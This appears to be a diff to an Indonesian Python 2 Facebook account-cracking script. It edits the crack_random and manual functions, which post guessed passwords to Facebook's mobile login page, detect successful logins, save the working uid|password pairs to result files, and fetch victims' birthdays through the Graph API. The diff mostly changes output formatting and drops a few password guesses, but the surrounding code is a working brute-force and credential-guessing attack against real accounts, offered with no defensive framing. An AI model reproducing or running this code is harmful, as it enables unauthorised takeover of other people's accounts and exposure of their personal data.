@@ -1185,9 +1185,7 @@ def crack_random():
 					pwx.append(ss+"12345")
 				else:
 					pwx.append(ss+"123")
-					pwx.append(ss+"1234")
 					pwx.append(ss+"12345")
-					pwx.append("12345")
 					pwx.append(ss)
 		    #<---- Pw tambahan bebas mau di isi apa ----->
 					pwx.append("sayang")
@@ -1199,7 +1197,7 @@ def crack_random():
 				aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = aw.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print '\r  %s* --> %s|%s                 %s' % (H,uid,pw,N)
+					print '\r %sID: %s|%s                 %s' % (H,uid,pw,N)
 					wrt = ' [✓] %s|%s' % (uid,pw)
 					ok.append(wrt)
 					open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -1211,7 +1209,7 @@ def crack_random():
 						ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uid,__cindy__))
 						az = json.loads(ak.text)
 						ttl= az['birthday'].replace('/','-')
-						print '\r  %s* --> %s|%s|%s     %s' % (K,uid,pw,ttl,N)
+						print '\r %sID: %s|%s|%s     %s' % (K,uid,pw,ttl,N)
 						wrt = ' [×] %s|%s|%s' % (uid,pw,ttl)
 						cp.append(wrt)
 						open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -1219,7 +1217,7 @@ def crack_random():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r  %s* --> %s|%s                %s' % (K,uid,pw,N)
+					print '\r %sID: %s|%s                %s' % (K,uid,pw,N)
 					wrt = ' [×] %s|%s' % (uid,pw)
 					cp.append(wrt)
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -1240,9 +1238,10 @@ def crack_random():
 	else:
 		exit()
 def manual():
-	print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
-	pw = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
-	print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pw, N)
+	print '\n [%s?%s] Contoh: %ssayang,bismillah,roy123%s '%(K,N,K,N)
+	print ' [%s!%s] %sGunakan simbol (,) untuk pemisah sandi%s '%(M,N,M,N)
+	pw = raw_input('\n [%s?%s] Masukkan Sandi Manual : '%(K,N))
+	print ' [%s?%s] Sandi Manual Telah Dibuat : [ %s%s%s ]' % (K,N,M, pw, N)
 	print ('')
 	if len(pw) ==0:
 		print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
@@ -1273,7 +1272,7 @@ def manual():
 				aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = aw.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print '\r  %s* --> %s|%s                 %s' % (H,uid,pw,N)
+					print '\r %sID: %s|%s                 %s' % (H,uid,pw,N)
 					wrt = ' [✓] %s|%s' % (uid,pw)
 					ok.append(wrt)
 					open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -1285,7 +1284,7 @@ def manual():
 						ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uid,__cindy__))
 						az = json.loads(ak.text)
 						ttl= az['birthday'].replace('/','-')
-						print '\r  %s* --> %s|%s|%s     %s' % (K,uid,pw,ttl,N)
+						print '\r %sID: %s|%s|%s     %s' % (K,uid,pw,ttl,N)
 						wrt = ' [×] %s|%s|%s' % (uid,pw,ttl)
 						cp.append(wrt)
 						open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -1293,7 +1292,7 @@ def manual():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r  %s* --> %s|%s                %s' % (K,uid,pw,N)
+					print '\r %sID: %s|%s                %s' % (K,uid,pw,N)
 					wrt = ' [×] %s|%s' % (uid,pw)
 					cp.append(wrt)
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
